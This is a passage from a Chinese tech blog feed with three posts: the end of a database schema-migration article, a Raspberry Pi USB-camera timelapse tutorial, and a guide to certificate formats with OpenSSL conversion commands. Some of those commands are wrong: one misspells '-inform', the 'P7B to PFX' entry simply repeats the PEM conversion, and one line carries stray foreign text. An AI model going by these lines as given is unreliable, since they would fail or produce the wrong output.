存在的问题</h2><ul><li>同样的，查询效率低</li><li>预设存在未知数，可能存在预设的字段不够，也可能存在空间冗余</li><li>冗余过多的空子字段，对存储空间的占用和性能的提升存在阻碍。</li><li>该方法还是比较笨的，不适合程序员思维</li></ul><h1 id="6-多主模式和分级更新"><a href="#6-多主模式和分级更新" class="headerlink" title="6 多主模式和分级更新"></a>6 多主模式和分级更新</h1><p>如果业务流量比较小，可以直接在表上进行字段新增或者修改，短暂的写锁是可以承受的。但如果是高并发、集群化、分布式的系统，则从数据层面上就应该进行主从或者分库分表治理。<br>以下是典型的的多主要模式下，进行数据库表结构升级的过程。<br><img src="https://static.luozhinet.com/e2/69857d27bf91c70b204a5878f2325e" alt="image"></p><ol><li>正常两主模式下，主主同步，可以使用DBproxy、Fabric 等数据中间件做负载均衡，也可以自己定义一些负载策略，比如 Range、Hash。</li><li>修改配置，让流量都切到其中一台上，然后对另外一台进行数据表升级（比如切DB1，只使用DB2）。切记在业务低峰期进行，避免流量过大导致另外一个数据库实例负载过大而挂起。</li><li>轮流这个操作，但是这时候不需要再升级DB2了，因为是主主同步。DB instance 1 已经是新的表结构了，这时候会连同架构包括数据一起更新到 DB2 上。</li><li>等两个数据库实例都一致了，修改配置，重设两个数据库实例的负载，恢复到之前的状态。</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> json </tag>
            
            <tag> 对应 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 对象 </tag>
            
            <tag> 程序 </tag>
            
            <tag> 运行 </tag>
            
            <tag> 代码 </tag>
            
            <tag> 无损 </tag>
            
            <tag> 空间 </tag>
            
            <tag> 字段 </tag>
            
            <tag> 数据 </tag>
            
            <tag> 迁移 </tag>
            
            <tag> t_user </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用树莓派USB摄像头做个监控</title>
      <link href="/posts/2c9261572067/"/>
      <url>/posts/2c9261572067/</url>
      
        <content type="html"><![CDATA[<h2 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h2><blockquote><p>看着阴暗的角落里吃灰噎到嗓子眼的树莓派，一起陪伴的时光历历在目，往事逐渐涌上心头，每每触及此处，内心总会升腾起阵阵怜悯之情…</p></blockquote><p>我这有两个设备，一个是积灰已久的树莓派，另一个是积灰已久的USB摄像头。</p><p>我们今天用这两个设备做一个拍摄监控方案（非视频录制），然后将拍摄好的图片合成视频进行观看。</p><p>主要用到的技术有：树莓派&#x2F;linux操作，crontab，python，ffmpeg。</p><h2 id="【系列目录】"><a href="#【系列目录】" class="headerlink" title="【系列目录】"></a>【系列目录】</h2><ol><li>树莓派驱动usb摄像头（非官方摄像头模块）</li><li>树莓派加载外接USB硬盘</li><li>树莓派拍摄获取素材程序</li><li>树莓派定时任务编写</li><li>将素材图片合成视频</li></ol><h2 id="【实现过程】"><a href="#【实现过程】" class="headerlink" title="【实现过程】"></a>【实现过程】</h2><h4 id="树莓派驱动usb摄像头（非官方摄像头模块）"><a href="#树莓派驱动usb摄像头（非官方摄像头模块）" class="headerlink" title="树莓派驱动usb摄像头（非官方摄像头模块）"></a>树莓派驱动usb摄像头（非官方摄像头模块）</h4><p>首先我们要保证树莓派可以识别usb摄像头设备，使用命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到usb设备列表第一个即 <em>海康威视1080p</em> usb摄像头，说明我们的摄像头设备被正确识别，如果无法识别，则要排除设备故障或想办法安装设备驱动程序。</p><p>我们使用fswebcam应用来驱动usb摄像头模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install fswebcam</span><br><span class="line">sudo apt-get install mplayer</span><br></pre></td></tr></table></figure><p>简单输入拍照命令测试下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fswebcam -r 1920*1080 --delay 3 --skip 10 1.jpg</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/68/d30bcb84ecd167082288728939949c" alt="image"></p><p><img src="https://static.luozhinet.com/06/c31781a6cbc5d1d8b0454655251d21" alt="image"></p><p>我们把树莓派上的 1.jpg 下载下来进行查看，成功拍摄到了画面！</p><p><img src="https://static.luozhinet.com/5e/8b6bcf5635c27baafcab938422f312" alt="image"></p><p>我们在使用fswebcam时，增加了几个参数，下面介绍这几个参数的作用：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 1920*1080</td><td>拍摄图片分辨率</td></tr><tr><td>--delay 3</td><td>延时3s后拍摄（给摄像头自动对焦的时间，否则会模糊，这个经常拍照的可以理解吧）</td></tr><tr><td>--skip 10</td><td>作用同上，拍摄时其实会拍摄好多帧，我们跳过前10帧以保证清晰度</td></tr></tbody></table><h4 id="树莓派加载外接USB硬盘"><a href="#树莓派加载外接USB硬盘" class="headerlink" title="树莓派加载外接USB硬盘"></a>树莓派加载外接USB硬盘</h4><p>我们计划编写一个程序来长时间捕捉摄像头画面，那么就需要一个比较大的存储空间来存放我们拍摄的图片，我们从小角落找到一个同样“积灰已久”的固态硬盘。</p><p>windows下使用过的硬盘，推荐格式化成<em>FAT32</em>格式，该格式是兼容Linux系统文件格式的，NTFS格式兼容性不是特别好，可能读写会出问题。</p><blockquote><p>当然直接用linux fdisk命令格式化成 ext2&#x2F;3&#x2F;4 也是可以的，但是后续在windows环境下读写又是新问题，如果硬盘不是准备永久挂载在linux系统下使用，还是建议用<em>FAT32</em>格式使用。</p></blockquote><blockquote><p>windows10&#x2F;11 下已经不提供格式成 <em>FAT32</em> 的入口，我们可以下载奥梅分区助手快速格式化成想要的格式。</p></blockquote><p>使用命令查看固态硬盘是否被识别</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsusb</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/76/4cb337cb9adfa8619785660f5d34f3" alt="image"></p><p>可以看到，第二个usb设备便是我们的usb固态硬盘设备了（M.2硬盘放到了USB硬盘盒进行外接）</p><p>使用 fdisk 命令查看硬盘属性</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/ca/4ead62f47bef4459e3d406d8869cab" alt="image"></p><p>使用 mount 挂载硬盘设备，将磁盘挂载到 &#x2F;mnt&#x2F;sda1 路径下</p><p>虽然网上有很多教程说配置一个配置文件（具体配置我就不说了），然后让设备开机自动挂载，但我个人极不推荐，修改配置文件开机自动挂载虽然貌似一劳永逸，但在硬盘设备发生变更时，大概率因为忘记同步修改配置文件，会造成无法启动系统的严重故障，折腾不说还可能需要重装系统解决…其实启动不频繁情况下，手动装载也不费事。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount /dev/sda3 /mnt/sda1</span><br></pre></td></tr></table></figure><p>然后使用 df 命令查看存储占用详情</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df</span><br></pre></td></tr></table></figure><p><img src="https://static.luozhinet.com/3b/84468b1d130947192a6af2f54e5eec" alt="image"></p><p>可以看到硬盘成功挂载。</p><h4 id="树莓派拍摄获取素材程序"><a href="#树莓派拍摄获取素材程序" class="headerlink" title="树莓派拍摄获取素材程序"></a>树莓派拍摄获取素材程序</h4><p>我们编写一个短小的python脚本来实现以下几点小功能：</p><ul><li>据时间归档目录</li><li>调用api执行拍照，并按时间戳命名</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path = <span class="string">&#x27;/mnt/sda1&#x27;</span></span><br><span class="line">    <span class="comment"># path = &#x27;E:\code\Project.Python\CameraShoot&#x27;</span></span><br><span class="line">    folder = <span class="string">f&#x27;<span class="subst">&#123;path&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d&quot;</span>)&#125;</span>&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(folder):</span><br><span class="line">        os.mkdir(folder)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 拍照</span></span><br><span class="line">    os.system(</span><br><span class="line">        <span class="string">f&#x27;fswebcam -r 1920*1080 --delay 3 --skip 10 <span class="subst">&#123;folder&#125;</span>/<span class="subst">&#123;time.strftime(<span class="string">&quot;%Y%m%d%H%M%S&quot;</span>)&#125;</span>.jpg&#x27;</span></span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h4 id="树莓派定时任务编写"><a href="#树莓派定时任务编写" class="headerlink" title="树莓派定时任务编写"></a>树莓派定时任务编写</h4><p>我们使用 linux 环境下的 crontab 编写定时任务，来定时执行拍照任务（初步定每分钟拍一张）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crontab -e</span><br><span class="line">* * * * * python /7tiny/camera_shoot.py</span><br></pre></td></tr></table></figure><p>采用定时任务，每分钟自动调度执行我们写好的python脚本，来进行拍照任务的执行</p><p>等待一段时间后，便可拿到拍摄素材…</p><p><img src="https://static.luozhinet.com/bf/98d9ef3a8b54c1fc38bd89e5893bf7" alt="image"></p><p><img src="https://static.luozhinet.com/3e/b29151741bc38c17762c7ac9681d08" alt="image"></p><h4 id="将素材图片合成视频"><a href="#将素材图片合成视频" class="headerlink" title="将素材图片合成视频"></a>将素材图片合成视频</h4><p>我们先简单从树莓派上下载下来拍摄好的图片，在 windows 上简单合成一个视频，完成我们的任务目标，后期可以根据需要在树莓派上自动合成。</p><p>我们用 ffmpeg 软件将图片合成为视频。</p><p>首先下载 ffmpeg 软件的 exe 版本（windows），linux上可直接下载linux版。</p><p>然后将解压后 ffmpeg 的 exe 目录添加到环境变量，方便我们执行命令。</p><p>将树莓派上的图片下载下来。</p><p><img src="https://static.luozhinet.com/0e/2087bb6f73079f8085b5de7fc1cc66" alt="image"></p><p>下载下来的图片我们是默认使用时间戳来命名图片的，因为ffmpeg只能从 0 - n 顺序识别图片，无法识别时间戳这种命名，因此，我这里自己编写了一个工具将图片名称替换成了 0 - n.jpg。</p><p>有需要的同学可以在文末获取到工具源码及下载地址。</p><p>重命名好后，我们执行命令压缩图片为 mp4 文件。</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -r <span class="number">10</span> -f image2 -i %d.jpg -vcodec libx264 -pix_fmt yuv420p out.mp4</span><br></pre></td></tr></table></figure><p>同样我们介绍下使用的几个参数：</p><table><thead><tr><th>参数</th><th>作用</th></tr></thead><tbody><tr><td>-r 10</td><td>视频为每秒10帧，可以根据需要调整，10帧就是10张图片</td></tr><tr><td>%d</td><td>从0开始在当前目录递增寻找图片</td></tr><tr><td>-vcodec libx264（windows兼容）</td><td></td></tr><tr><td>-vcodec libx265（体积更小，windows默认不支持）</td><td>视频压缩参数</td></tr><tr><td>-pix_fmt yuv420p</td><td>视频编码格式（windows下播放兼容）</td></tr></tbody></table><p>执行后，我们便可查看到图片被拼接成为 mp4 格式的视频。</p><p><img src="https://static.luozhinet.com/e2/635305b8ad961ffad26395b53a4fc8" alt="image"></p><p><img src="https://static.luozhinet.com/c6/57431b6621e6f56c8c111dcae343ea" alt="image"></p><h2 id="【总结】"><a href="#【总结】" class="headerlink" title="【总结】"></a>【总结】</h2><p>本文通过短小的代码片段初步使用树莓派+usb摄像头进行环境捕捉，在此基础上，可以进行很多额外的场景扩展及使用优化。</p><h2 id="【源码地址】"><a href="#【源码地址】" class="headerlink" title="【源码地址】"></a>【源码地址】</h2><p>重命名工具源码及编译后绿色程序：<br><a href="https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe">https://github.com/sevenTiny/SevenTinyToolBox/blob/main/tools/SevenTinyToolBox.RenameWithNumber.exe</a></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件 </tag>
            
            <tag> 变量 </tag>
            
            <tag> 格式 </tag>
            
            <tag> 程序 </tag>
            
            <tag> 地址 </tag>
            
            <tag> 素材 </tag>
            
            <tag> import </tag>
            
            <tag> 命令 </tag>
            
            <tag> 视频 </tag>
            
            <tag> 软件 </tag>
            
            <tag> sudo </tag>
            
            <tag> 代码 </tag>
            
            <tag> 图片 </tag>
            
            <tag> 同学 </tag>
            
            <tag> 空间 </tag>
            
            <tag> 录制 </tag>
            
            <tag> 树莓 </tag>
            
            <tag> usb </tag>
            
            <tag> ffmpeg </tag>
            
            <tag> 硬盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CA证书介绍与格式转换</title>
      <link href="/posts/fc69325788da/"/>
      <url>/posts/fc69325788da/</url>
      
        <content type="html"><![CDATA[<h1 id="CA证书介绍与格式转换"><a href="#CA证书介绍与格式转换" class="headerlink" title="CA证书介绍与格式转换"></a>CA证书介绍与格式转换</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>PKCS 公钥加密标准（Public Key Cryptography Standards, PKCS），此一标准的设计与发布皆由RSA资讯安全公司（英语：RSA Security）所制定，PKCS 目前共发布过 15 个标准。<a href="https://zh.m.wikipedia.org/zh-hans/%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E5%AD%A6%E6%A0%87%E5%87%86" title="公钥密码学标准">更多公钥加密标准</a></p><p>X.509 是密码学里公钥证书的格式标准。</p><blockquote><p>X.509是常见通用的证书格式。是ITU-T标准化部门基于他们之前的ASN.1定义的一套证书标准。  </p><p>X.509附带了证书吊销列表和用于从最终对证书进行签名的证书签发机构直到最终可信点为止的证书合法性验证算法。  </p><p>X.509证书已应用在包括TLS&#x2F;SSL在内的众多网络协议里，同时它也用在很多非在线应用场景里。</p></blockquote><p>应用场景如电子签名服务。X.509证书里含有公钥、身份信息（比如网络主机名，组织的名称或个体名称等）和签名信息（可以是证书签发机构CA的签名，也可以是自签名）。</p><ol><li><p>常用加密标准：</p><ul><li>PKCS #7： 密码讯息语法标准（Cryptographic Message Syntax Standard），规范了以公开金钥基础设施（PKI）所产生之签章&#x2F;密文之格式。其目的一样是为了拓展数位证书的应用。</li><li>PKCS #10： 证书申请标准（Certification Request Standard），英语：PKCS_10，规范了向证书中心申请证书之CSR（certificate signing request）的格式。</li><li>PKCS #12： 个人讯息交换标准（Personal Information Exchange Syntax Standard），定义了包含私钥与公钥证书（public key certificate）的文件格式。私钥采密码(password)保护。常见的PFX就履行了PKCS#12。</li></ul></li><li><p>常用扩展名：</p><ul><li>PKCS#7格式： .P7B .P7C .SPC</li><li>PKCS#12格式： .P12 .PFX .PKCS12</li><li>JKS格式： .jks .keystore .truststore</li><li>.pem – 隐私增强型电子邮件（Privacy-enhanced Electronic Mail）格式，通常是Base64格式的。</li><li>.cer &#x2F;.crt &#x2F;.der – 通常是DER（X.690#DER_encoding）二进制格式的。</li><li>.cer &#x2F;.crt是用于存放证书，它是2进制形式存放的，不含私钥。</li><li>.p12 – PKCS#12格式，包含证书的同时可能还包含私钥</li><li>.pfx – PFX，PKCS#12之前的格式（通常用PKCS#12格式，比如由互联网资讯服务产生的PFX文件）</li><li>.pfx &#x2F;.p12 用于存放个人证书&#x2F;私钥，他通常包含保护密码，2进制方式。</li><li>.p7r 是CA对证书请求的回复，只用于导入。</li><li>.p7b 以树状展示证书链(certificate chain)，同时也支持单个证书，不含私钥。</li></ul></li></ol><h3 id="术语介绍"><a href="#术语介绍" class="headerlink" title="术语介绍"></a>术语介绍</h3><ol><li>密钥对： 在非对称加密技术中，有两种密钥，分为私钥和公钥。</li><li>公钥： 公钥用来给数据加密，用公钥加密的数据只能使用私钥解密，公钥是密钥对持有者公布给他人的。</li><li>私钥： 用来解密公钥加密的数据，私钥是密钥对所有者持有，不可公布。</li><li>摘要： 对需要传输的文本，做一个HASH计算，一般采用SHA1，SHA2来获得。</li><li>签名： 使用私钥对需要传输的文本的摘要进行加密，得到的密文即被称为该次传输过程的签名。</li><li>签名验证： 数据接收端，拿到传输文本，但是需要确认该文本是否就是发送发出的内容，中途是否曾经被篡改。因此拿自己持有的公钥对签名进行解密（密钥对中的一种密钥加密的数据必定能使用另一种密钥解密。），得到了文本的摘要，然后使用与发送方同样的HASH算法计算摘要值，再与解密得到的摘要做对比，发现二者完全一致，则说明文本没有被篡改过。</li><li>密钥分为两种： <code>对称密钥</code>与<code>非对称密钥</code><ol><li>对称密钥加密： 又称私钥加密或会话密钥加密算法，指的就是加、解密使用的同是一串密钥，所以被称做对称加密。它的最大优势是加&#x2F;解密速度快，适合于对大数据量进行加密，但密钥管理困难。</li><li>非对称密钥加密： 又称公钥密钥加密。指的是加、解密使用不同的密钥，一把作为公开的公钥，另一把作为私钥保存。公钥机制灵活，但加密和解密速度却比对称密钥加密慢得多。</li></ol></li></ol><p>Tips：</p><ul><li>密钥指的是私钥或者公钥 —&gt; 密钥 &#x3D; 私钥&#x2F;公钥；</li><li>密钥对指的是公钥加上私钥 —&gt; 密钥对 &#x3D; 私钥+公钥；</li><li>非对称加密：<ul><li>公钥和私钥是成对的，公钥和私钥唯一对应，它们互相解密。</li><li>公钥一般用来加密和验证签名，私钥用来签名和解密。</li><li>加密（加解密）： 公钥加密，私钥解密；加密的目的是保证信息的保密传输，使只有具备资格的一方才能解密。</li><li>认证（加验签）： 私钥数字签名，公钥验证签名；加签的目的是让收到消息的一方确认该消息是由特定方发送的。</li></ul></li><li>在实际的应用中，通常将两者结合在一起使用，例如，对称密钥加密系统用于存储大量数据信息，而公开密钥加密系统则用于加密密钥。</li></ul><p>原文链接：<a href="https://blog.csdn.net/qq_41586280/article/details/82669840">https://blog.csdn.net/qq_41586280&#x2F;article&#x2F;details&#x2F;82669840</a></p><h3 id="PEM-格式"><a href="#PEM-格式" class="headerlink" title="PEM 格式"></a>PEM 格式</h3><ol><li>PEM格式是证书颁发机构颁发证书的最常见格式.PEM证书通常具有扩展名，例如.pem，.crt，.cer和.key。</li><li>它们是以二进制文件的Base64编码的保存，包含“—– BEGIN CERTIFICATE —–”和“—– END CERTIFICATE —–”语句。</li><li>服务器证书，中间证书和私钥都可以放入PEM格式。</li><li>相较于PEM的Base64编码格式以文本文件的形式存在，<code>CERT格式</code>的文件为PEM的二进制格式，文件扩展名.cert &#x2F;.cer &#x2F;.crt。</li><li><code>KEY格式</code>通常用来存放公钥或者私钥，并非X.509证书，编码可能是PEM也有可能是DER，扩展名为 .key。</li></ol><p>Apache和其他类似服务器使用PEM格式证书。几个PEM证书，甚至私钥，可以包含在一个文件中，一个在另一个文件之下，但是大多数平台（例如Apache）希望证书和私钥位于单独的文件中。</p><h3 id="DER-格式"><a href="#DER-格式" class="headerlink" title="DER 格式"></a>DER 格式</h3><ol><li>DER格式只是证书的二进制形式，不含私钥。</li><li>文件扩展名通常是.cer，有时会有.der的文件扩展名。</li><li>判断DER .cer文件和PEM .cer文件方法是在文本编辑器中打开它，并查找BEGIN &#x2F; END语句。</li><li>所有类型的证书和私钥都可以用DER格式编码。</li><li>DER通常与Java平台一起使用。</li><li>SSL转换器只能将证书转换为DER格式。</li></ol><h3 id="PKCS＃7-x2F-P7B-格式"><a href="#PKCS＃7-x2F-P7B-格式" class="headerlink" title="PKCS＃7 &#x2F; P7B 格式"></a>PKCS＃7 &#x2F; P7B 格式</h3><ol><li>PKCS#7是签名或加密数据的格式标准，官方称之为容器。由于证书是可验真的签名数据，所以可以用SignedData结构表述。</li><li>PKCS#7或P7B格式通常以Base64 ASCII格式存储，文件扩展名为.p7b或.p7c。</li><li>P7B证书包含“—– BEGIN PKCS7 —–”和“—– END PKCS7 —–”语句。</li><li>P7B文件仅包含证书和链证书，而不包含私钥。</li><li>多个平台支持P7B文件，包括Microsoft Windows和Java Tomcat。</li></ol><h3 id="PKCS＃12-x2F-PFX-格式"><a href="#PKCS＃12-x2F-PFX-格式" class="headerlink" title="PKCS＃12 &#x2F; PFX 格式"></a>PKCS＃12 &#x2F; PFX 格式</h3><ol><li>PKCS#12 是公钥加密标准，通用格式（rsa公司标准）。规定了可包含所有私钥、公钥和证书。文件格式是加密过的。</li><li>PKCS#12 或 PFX 格式是其以二进制格式存储，也称为 PFX 文件，在windows中可以直接导入到密钥区。也可用于导入和导出证书和私钥。</li><li>PKCS#12 由 PFX 进化而来的，用于<code>交换公共的和私有的对象</code>的标准格式。</li><li>文件通常具有扩展名，例如.pkcs12 .pfx .p12。</li><li>密钥库和私钥用相同密码进行保护</li></ol><h3 id="JKS-格式"><a href="#JKS-格式" class="headerlink" title="JKS 格式"></a>JKS 格式</h3><ol><li>JKS是java用来存储密钥的容器。可以同时容纳n个公钥或私钥，后缀一般是.jks或者.keystore或.truststore等。</li><li>在Java 8之前，这些文件的默认格式为JKS(android .keystore 也是jsk格式的证书)。</li><li>从Java 9开始，默认的密钥库格式为PKCS12。</li><li>Android签名keystore文件也是jks格式，且1.8之后要求转换到p12格式。</li><li>JKS是二进制格式，同时包含证书和私钥，一般有密码保护，只能存储非对称密钥对（私钥 + x509公钥证书）。</li><li>当应用程序需要通过SSL &#x2F; TLS进行通信时，在大多数情况下将使用java keystore和java truststore。</li><li>密钥库和私钥用不同的密码进行保护</li></ol><p><strong>JKS和PKCS12之间的最大区别是JKS是Java专用的格式，而PKCS12是存储加密的私钥和证书的标准化且与语言无关的方式。</strong></p><h2 id="格式转换"><a href="#格式转换" class="headerlink" title="格式转换"></a>格式转换</h2><blockquote><p>OpenSSL是一个非常有用的开源命令行工具包，可用于 X.509 证书，证书签名请求（CSRs）和加密密钥。</p></blockquote><h3 id="查看证书"><a href="#查看证书" class="headerlink" title="查看证书"></a>查看证书</h3><ul><li><p>查看 PEM证书</p><blockquote><p>openssl x509 -text -noout -in CERTIFICATE.pem</p></blockquote></li><li><p>查看 DER证书</p><blockquote><p>openssl x509 -inder der -text -noout -in CERTIFICATE.der</p></blockquote></li><li><p>查看 CSR证书</p><blockquote><p>openssl req -text -noout -in mysite.csr</p></blockquote></li><li><p>查看 P7B证书</p><blockquote><p>openssl pkcs7 -inform der -in CERTIFICATE.p7b -print_certs -text</p></blockquote></li><li><p>查看 JKS证书</p><blockquote><p>keytool -list -rfc -keystore server.jks -storepass XXXXXX</p></blockquote></li></ul><h3 id="转换证书"><a href="#转换证书" class="headerlink" title="转换证书"></a>转换证书</h3><h4 id="转换-PEM证书（-pem-x2F-crt-x2F-cer）"><a href="#转换-PEM证书（-pem-x2F-crt-x2F-cer）" class="headerlink" title="转换 PEM证书（.pem &#x2F;.crt &#x2F;.cer）"></a>转换 PEM证书（.pem &#x2F;.crt &#x2F;.cer）</h4><ul><li><p>PEM to DER</p><blockquote><p>openssl x509 -outform der -in CERTIFICATE.pem -out CERTIFICATE.der</p></blockquote></li><li><p>PEM to P7B</p><blockquote><p>openssl crl2pkcs7 -nocrl -certfile CERTIFICATE.cer -certfile CACert.cer -out CERTIFICATE.p7b</p></blockquote></li><li><p>PEM to PFX</p><blockquote><p>openssl pkcs12 -export -out CERTIFICATE.pfx -inkey PRIVATEKEY.key -in CERTIFICATE.crt [-certfile CACert.crt]  </p><p>openssl pkcs12 -export -out CERTIFICATE.pfx -inkey PRIVATEKEY.key -in CERTIFICATE.cer [-certfile CACert.cer]  </p><p>openssl pkcs12 -export -out server.p12 -inkey server.key -in server.pem</p></blockquote></li></ul><h4 id="转换-DER证书（der-x2F-crt-x2F-cer）"><a href="#转换-DER证书（der-x2F-crt-x2F-cer）" class="headerlink" title="转换 DER证书（der &#x2F;.crt &#x2F;.cer）"></a>转换 DER证书（der &#x2F;.crt &#x2F;.cer）</h4><ul><li><p>DER to PEM</p><blockquote><p>openssl x509 -inform der -in CERTIFICATE.cer -out CERTIFICATE.pem</p></blockquote></li></ul><h4 id="转换-P7B证书（-p7b-x2F-p7c）"><a href="#转换-P7B证书（-p7b-x2F-p7c）" class="headerlink" title="转换 P7B证书（.p7b &#x2F;.p7c）"></a>转换 P7B证书（.p7b &#x2F;.p7c）</h4><ul><li><p>P7B to PEM</p><blockquote><p>openssl pkcs7 -print_certs -in CERTIFICATE.p7b -out CERTIFICATE.cer</p></blockquote></li><li><p>P7B to PFX</p><blockquote><p>openssl pkcs7 -print_certs -in CERTIFICATE.p7b -out CERTIFICATE.cer</p></blockquote></li></ul><h4 id="转换-PFX证书（-pkcs12-x2F-pfx-x2F-p12）"><a href="#转换-PFX证书（-pkcs12-x2F-pfx-x2F-p12）" class="headerlink" title="转换 PFX证书（.pkcs12 &#x2F;.pfx &#x2F;.p12）"></a>转换 PFX证书（.pkcs12 &#x2F;.pfx &#x2F;.p12）</h4><ul><li><p>PFX to PEM</p><blockquote><p>openssl pkcs12 -in CERTIFICATE.pfx -out CERTIFICATE.cer -nodes konwersja poprze OpenSSL  </p><p>openssl pkcs12 -nocerts -nodes -in cert.p12 -out private.pem  </p><p>openssl pkcs12 -clcerts -nokeys -in cert.p12 -out cert.pem</p></blockquote></li></ul><p>（PFX to PEM后CERTIFICATE.cer文件包含认证证书和私钥，需要把它们分开存储才能使用。）</p><h3 id="常用选项"><a href="#常用选项" class="headerlink" title="常用选项"></a>常用选项</h3><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">-inform PEM|DER    输入格式 - DER或PEM（x509默认为PEM）</span><br><span class="line">-in infile         输入文件（x509默认为stdin）</span><br><span class="line">-outform PEM|DER   输出格式 - DER或PEM（x509默认为PEM）</span><br><span class="line">-out outfile       输出文件（x509默认为stdout）</span><br><span class="line">-keyform PEM|DER|ENGINE 私钥格式 - 默认PEM</span><br><span class="line">-passin val        私钥密码/口令来源</span><br><span class="line">-modulus           打印RSA密钥模数</span><br><span class="line">-pubkey            输出公钥</span><br><span class="line">-fingerprint       打印证书的指纹</span><br><span class="line">-alias             输出证书别名</span><br><span class="line">-noout             没有输出，只有状态</span><br><span class="line">-nocert            无证书输出</span><br><span class="line">-trustout          输出一个受信任的证书</span><br><span class="line">-setalias val      设置证书别名</span><br><span class="line">-days int          签署的证书到期前的时间 - 默认 30 天</span><br><span class="line">-signkey val       用参数自行签署证书</span><br><span class="line">-x509toreq         输出一个认证请求对象</span><br><span class="line">-req               输入是一个证书请求，签署并输出</span><br><span class="line">-CA infile         设置CA证书，必须是PEM格式</span><br><span class="line">-CAkey val         设置 CA 密钥，必须是 PEM 格式；如果不在 CAfile 中</span><br><span class="line">-text              打印文本形式的证书</span><br><span class="line">-ext val           打印各种X509V3扩展文件</span><br><span class="line">-extfile infile    要添加X509V3扩展的文件</span><br><span class="line">-writerand outfile 将随机数据写到指定文件中</span><br><span class="line">-extensions val    要使用的配置文件中的部分</span><br><span class="line">-nameopt val       各种证书名称选项</span><br><span class="line">-certopt val       各种证书文本选项</span><br><span class="line">-checkhost val     检查证书是否与主机匹配</span><br><span class="line">-checkemail val    检查证书是否与电子邮件匹配</span><br><span class="line">-checkip val       检查证书是否与ipaddr匹配</span><br><span class="line">-CAform PEM|DER    CA格式--默认PEM</span><br><span class="line">-CAkeyform PEM|DER|ENGINE      CA密钥格式--默认为PEM</span><br><span class="line"></span><br><span class="line">-export        输出PKCS12文件</span><br><span class="line">-nodes         不要加密私钥</span><br><span class="line">-nokeys        不输出私钥</span><br><span class="line">-keysig        设置 MS 密钥签名类型</span><br><span class="line">-nocerts       不输出证书</span><br><span class="line">-clcerts       只输出客户证书</span><br><span class="line">-cacerts       只输出CA证书</span><br><span class="line">-info          打印有关PKCS#12结构的信息</span><br><span class="line">-chain         添加证书链</span><br><span class="line">-certpbe val   证书PBE算法(默认为RC2-40)</span><br><span class="line">-inkey val     